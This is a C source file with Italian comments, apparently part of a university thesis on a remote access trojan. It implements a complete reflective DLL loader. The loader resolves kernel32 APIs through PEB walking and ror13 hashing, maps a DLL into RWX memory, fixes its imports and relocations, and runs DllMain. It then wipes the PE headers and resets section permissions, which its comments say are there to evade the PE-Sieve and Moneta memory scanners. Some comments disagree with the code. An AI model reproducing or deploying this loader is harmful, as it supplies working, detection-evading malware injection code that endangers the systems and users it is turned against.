/*
 * ReflectiveLoader.c
 * Loader PE in-memory completamente autocontenuto
 * Nessuna chiamata esterna — tutto inline per garantire PIC
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
 *
 * Flusso:
 * 1. PEB walk inline per trovare kernel32
 * 2. Risolve LoadLibraryA, GetProcAddress, VirtualAlloc, VirtualProtect
 * 3. Alloca SizeOfImage bytes in memoria
 * 4. Copia headers e sezioni dal buffer raw
 * 5. Risolve import table
 * 6. Applica relocations
 * 7. Chiama DllMain(DLL_PROCESS_ATTACH)
 * 8. Wipe PE headers (anti PE-Sieve)
 * 9. Fix permessi sezioni (anti Moneta)
 */

#include "ReflectiveLoader.h"

/* ── Hash constants ───────────────────────────────────────── */
#define HASH_KERNEL32        0x6E2BCA17
#define HASH_LOADLIBRARYA    0xEC0E4E8E
#define HASH_GETPROCADDRESS  0x7C0DFCAA
#define HASH_VIRTUALALLOC    0x91AFCA54
#define HASH_VIRTUALPROTECT  0x7946C61B

/* ── Tipi locali ──────────────────────────────────────────── */
typedef HMODULE (WINAPI * _LoadLibraryA  )(LPCSTR);
typedef FARPROC (WINAPI * _GetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI * _VirtualAlloc  )(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI * _VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI * _DllMain       )(HINSTANCE, DWORD, LPVOID);

/* ── Legge PEB tramite GS register — sempre inline ───────── */
static __attribute__((always_inline)) ULONG_PTR
read_peb(void) {
    ULONG_PTR r;
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(r));
    return r;
}

/* ── Rotate right 8 bit ───────────────────────────────────── */
static __attribute__((always_inline)) DWORD
ror13(DWORD v) {
    return (v >> 13) | (v << 19);
}

/* ── Hash di una stringa ASCII ────────────────────────────── */
static __attribute__((always_inline)) DWORD
hash_str(const char *s) {
    DWORD h = 0;
    do { h = ror13(h); h += (DWORD)(*s); } while (*++s);
    return h;
}

/* ── Entry point del loader ───────────────────────────────── */
/* dllexport necessario: test_loader cerca "ReflectiveLoader"
 * nell'export table del buffer raw della DLL.            */
__declspec(dllexport)
ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpDllBase) {

    _LoadLibraryA   pLoadLibraryA   = NULL;
    _GetProcAddress pGetProcAddress = NULL;
    _VirtualAlloc   pVirtualAlloc   = NULL;
    _VirtualProtect pVirtualProtect = NULL;

    ULONG_PTR uiBase;
    ULONG_PTR uiLibAddr;
    ULONG_PTR uiValueB;
    ULONG_PTR uiValueC;
    ULONG_PTR uiValueD;
    ULONG_PTR uiValueE;
    USHORT    usCounter;

    /* ════════════════════════════════════════════════════════
     * STEP 1 — Trova kernel32 tramite PEB walk
     * GS:[0x60] = PEB
     * PEB+0x18  = PEB_LDR_DATA*
     * LDR+0x20  = InMemoryOrderModuleList.Flink
     * Ogni entry (offset da Flink):
     *   +0x30 = DllBase
     *   +0x58 = BaseDllName.Length (USHORT, in bytes)
     *   +0x60 = BaseDllName.Buffer (PWSTR)
     * ════════════════════════════════════════════════════════ */
       ULONG_PTR uiPeb   = read_peb();
       ULONG_PTR uiLdr   = *(ULONG_PTR *)(uiPeb + 0x18);  // PEB->Ldr
       ULONG_PTR uiEntry = *(ULONG_PTR *)(uiLdr + 0x10);  //InLoadOrderModuleList.Flink
       ULONG_PTR uiStart = uiEntry;

    do {
        ULONG_PTR uiDllBase = *(ULONG_PTR *)(uiEntry + 0x30); // DllBase
        USHORT    usLen     = *(USHORT    *)(uiEntry + 0x58); // BaseDllName.Length
        PWSTR     pwBuf     = *(PWSTR     *)(uiEntry + 0x60); // BaseDllName.Buffer

        if (!uiDllBase || !pwBuf || !usLen) {
            uiEntry = *(ULONG_PTR *)uiEntry;
            continue;
        }

        /* Hash nome DLL wide-string case-insensitive */
        DWORD h = 0;
        USHORT n = usLen / sizeof(WCHAR);
        for (USHORT i = 0; i < n; i++) {
            h = ror13(h);
            WCHAR wc = pwBuf[i];
            if (wc >= L'a' && wc <= L'z') wc -= 0x20;
            h += (DWORD)wc;
        }

        if (h == HASH_KERNEL32) {
            /* Parse export table di kernel32 */
            PIMAGE_DOS_HEADER pD =
                (PIMAGE_DOS_HEADER)uiDllBase;
            PIMAGE_NT_HEADERS pN =
                (PIMAGE_NT_HEADERS)(uiDllBase + pD->e_lfanew);
            PIMAGE_EXPORT_DIRECTORY pE =
                (PIMAGE_EXPORT_DIRECTORY)(uiDllBase +
                pN->OptionalHeader
                  .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                  .VirtualAddress);

            DWORD *names = (DWORD *)(uiDllBase + pE->AddressOfNames);
            WORD  *ords  = (WORD  *)(uiDllBase + pE->AddressOfNameOrdinals);
            DWORD *funcs = (DWORD *)(uiDllBase + pE->AddressOfFunctions);

            for (DWORD i = 0; i < pE->NumberOfNames; i++) {
                char     *nm = (char *)(uiDllBase + names[i]);
                DWORD     fh = hash_str(nm);
                ULONG_PTR fa = uiDllBase + funcs[ords[i]];

                if      (fh == HASH_LOADLIBRARYA)   pLoadLibraryA   = (_LoadLibraryA)fa;
                else if (fh == HASH_GETPROCADDRESS)  pGetProcAddress = (_GetProcAddress)fa;
                else if (fh == HASH_VIRTUALALLOC)    pVirtualAlloc   = (_VirtualAlloc)fa;
                else if (fh == HASH_VIRTUALPROTECT)  pVirtualProtect = (_VirtualProtect)fa;

                if (pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pVirtualProtect)
                    break;
            }
            break;
        }

        uiEntry = *(ULONG_PTR *)uiEntry;
    } while (uiEntry && uiEntry != uiStart);

    /* Fallimento step 1 — ritorna codice errore < 10 */
    if (!pLoadLibraryA)   return 1;
    if (!pGetProcAddress) return 2;
    if (!pVirtualAlloc)   return 3;
    if (!pVirtualProtect) return 7;

    /* ════════════════════════════════════════════════════════
     * STEP 2 — Valida il buffer DLL ricevuto come parametro
     * ════════════════════════════════════════════════════════ */
    uiLibAddr = (ULONG_PTR)lpDllBase;
    PIMAGE_DOS_HEADER pDos =
        (PIMAGE_DOS_HEADER)uiLibAddr;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 4;

    PIMAGE_NT_HEADERS pNt =
        (PIMAGE_NT_HEADERS)(uiLibAddr + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return 5;

    /* ════════════════════════════════════════════════════════
     * STEP 3 — Alloca SizeOfImage bytes con RWX
     * (necessario per copia + reloc, verrà corretto allo step 9)
     * ════════════════════════════════════════════════════════ */
    uiBase = (ULONG_PTR)pVirtualAlloc(
        NULL,
        pNt->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    if (!uiBase) return 6;

    /* ════════════════════════════════════════════════════════
     * STEP 4 — Copia headers
     * ════════════════════════════════════════════════════════ */
    uiValueC = pNt->OptionalHeader.SizeOfHeaders;
    uiValueD = uiLibAddr;
    uiValueE = uiBase;
    while (uiValueC--)
        *(BYTE *)uiValueE++ = *(BYTE *)uiValueD++;

    /* ════════════════════════════════════════════════════════
     * STEP 5 — Copia sezioni
     * ════════════════════════════════════════════════════════ */
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (usCounter = 0;
         usCounter < pNt->FileHeader.NumberOfSections;
         usCounter++) {
        uiValueE = uiBase    + pSec->VirtualAddress;
        uiValueC = uiLibAddr + pSec->PointerToRawData;
        uiValueB = pSec->SizeOfRawData;
        while (uiValueB--)
            *(BYTE *)uiValueE++ = *(BYTE *)uiValueC++;
        pSec++;
    }

    /* Ricalcola pNt nella nuova posizione in memoria */
    pNt = (PIMAGE_NT_HEADERS)(uiBase + pDos->e_lfanew);

    /* ════════════════════════════════════════════════════════
     * STEP 6 — Risolvi Import Address Table
     * ════════════════════════════════════════════════════════ */
    IMAGE_DATA_DIRECTORY impDir =
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (impDir.Size) {
        PIMAGE_IMPORT_DESCRIPTOR pImp =
            (PIMAGE_IMPORT_DESCRIPTOR)(uiBase + impDir.VirtualAddress);

        while (pImp->Name) {
            HMODULE hLib =
                pLoadLibraryA((LPCSTR)(uiBase + pImp->Name));

            ULONG_PTR *pOFT =
                (ULONG_PTR *)(uiBase + pImp->OriginalFirstThunk);
            ULONG_PTR *pFT =
                (ULONG_PTR *)(uiBase + pImp->FirstThunk);

            while (*pOFT) {
                if ((*pOFT) & IMAGE_ORDINAL_FLAG)
                    *pFT = (ULONG_PTR)pGetProcAddress(
                        hLib, (LPCSTR)IMAGE_ORDINAL(*pOFT));
                else
                    *pFT = (ULONG_PTR)pGetProcAddress(
                        hLib,
                        (LPCSTR)((PIMAGE_IMPORT_BY_NAME)
                            (uiBase + *pOFT))->Name);
                pOFT++;
                pFT++;
            }
            pImp++;
        }
    }

    /* ════════════════════════════════════════════════════════
     * STEP 7 — Applica Base Relocations
     * ════════════════════════════════════════════════════════ */
    IMAGE_DATA_DIRECTORY relDir =
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (relDir.Size) {
        ULONG_PTR delta =
            uiBase - (ULONG_PTR)pNt->OptionalHeader.ImageBase;

        PIMAGE_BASE_RELOCATION pReloc =
            (PIMAGE_BASE_RELOCATION)(uiBase + relDir.VirtualAddress);

        while (pReloc->SizeOfBlock) {
            ULONG_PTR page = uiBase + pReloc->VirtualAddress;
            DWORD count = (pReloc->SizeOfBlock
                          - sizeof(IMAGE_BASE_RELOCATION))
                          / sizeof(IMAGE_RELOC);
            PIMAGE_RELOC pRel = (PIMAGE_RELOC)
                ((ULONG_PTR)pReloc + sizeof(IMAGE_BASE_RELOCATION));

            for (DWORD i = 0; i < count; i++) {
                if (pRel->type == IMAGE_REL_BASED_DIR64)
                    *(ULONG_PTR *)(page + pRel->offset) += delta;
                else if (pRel->type == IMAGE_REL_BASED_HIGHLOW)
                    *(DWORD *)(page + pRel->offset) += (DWORD)delta;
                pRel++;
            }
            pReloc = (PIMAGE_BASE_RELOCATION)
                ((ULONG_PTR)pReloc + pReloc->SizeOfBlock);
        }
    }

    /* ════════════════════════════════════════════════════════
     * STEP 8 — Chiama DllMain(DLL_PROCESS_ATTACH)
     * ════════════════════════════════════════════════════════ */
    ULONG_PTR uiEP = uiBase +
        ((PIMAGE_NT_HEADERS)(uiBase + pDos->e_lfanew))
        ->OptionalHeader.AddressOfEntryPoint;

     ((_DllMain)uiEP)(
        (HINSTANCE)uiBase,
        DLL_PROCESS_ATTACH,
        NULL);

    /* ════════════════════════════════════════════════════════
     * STEP 9 — Wipe PE headers (anti PE-Sieve)
     *
     * PE-Sieve scansiona regioni di memoria privata cercando
     * IMAGE_DOS_SIGNATURE (MZ) e IMAGE_NT_SIGNATURE (PE\0\0).
     * Azzerando gli headers, la regione non viene più
     * riconosciuta come un PE iniettato.
     *
     * NOTA: usiamo pNt dal buffer ALLOCATO (uiBase), che è
     * ancora valido perché non lo abbiamo ancora azzerato.
     * Salviamo SizeOfHeaders PRIMA di sovrascrivere.
     * ════════════════════════════════════════════════════════ */
    {
        PIMAGE_NT_HEADERS pNtLocal =
            (PIMAGE_NT_HEADERS)(uiBase +
                ((PIMAGE_DOS_HEADER)uiBase)->e_lfanew);
        SIZE_T hdrSize = pNtLocal->OptionalHeader.SizeOfHeaders;

        DWORD dwOldProt = 0;
        pVirtualProtect((LPVOID)uiBase, hdrSize,
                        PAGE_READWRITE, &dwOldProt);

        /* Azzera byte per byte — no memset per garantire PIC */
        BYTE *pHdr = (BYTE *)uiBase;
        SIZE_T hdrSz = hdrSize;
        while (hdrSz--)
            *pHdr++ = 0;

        pVirtualProtect((LPVOID)uiBase, hdrSize,
                        PAGE_READONLY, &dwOldProt);
    }

    /* ════════════════════════════════════════════════════════
     * STEP 10 — Fix permessi sezioni (anti Moneta)
     *
     * Moneta flagga regioni di memoria privata con permessi
     * PAGE_EXECUTE_READWRITE. Assegniamo a ogni sezione i
     * permessi minimi basati sulle Characteristics del PE:
     *   .text  → PAGE_EXECUTE_READ  (RX)
     *   .rdata → PAGE_READONLY      (R)
     *   .data  → PAGE_READWRITE     (RW)
     *
     * Usiamo i section headers dal BUFFER ORIGINALE (uiLibAddr)
     * perché quelli in uiBase sono stati azzerati nello step 9.
     * ════════════════════════════════════════════════════════ */
    {
        PIMAGE_DOS_HEADER pDosOrig =
            (PIMAGE_DOS_HEADER)uiLibAddr;
        PIMAGE_NT_HEADERS pNtOrig =
            (PIMAGE_NT_HEADERS)(uiLibAddr + pDosOrig->e_lfanew);
        PIMAGE_SECTION_HEADER pS =
            IMAGE_FIRST_SECTION(pNtOrig);

        for (USHORT i = 0;
             i < pNtOrig->FileHeader.NumberOfSections;
             i++)
        {
            DWORD prot = PAGE_READONLY;
            DWORD ch   = pS->Characteristics;

            BOOL exec  = (ch & IMAGE_SCN_MEM_EXECUTE) != 0;
            BOOL write = (ch & IMAGE_SCN_MEM_WRITE)   != 0;

            if      (exec && write)  prot = PAGE_EXECUTE_READWRITE;
            else if (exec)           prot = PAGE_EXECUTE_READ;
            else if (write)          prot = PAGE_READWRITE;
            /* else                    PAGE_READONLY */

            SIZE_T secSz = pS->Misc.VirtualSize;
            if (secSz == 0)
                secSz = pS->SizeOfRawData;

            DWORD secOld = 0;
            pVirtualProtect(
                (LPVOID)(uiBase + pS->VirtualAddress),
                secSz,
                prot,
                &secOld);

            pS++;
        }
    }

    return uiBase;
}
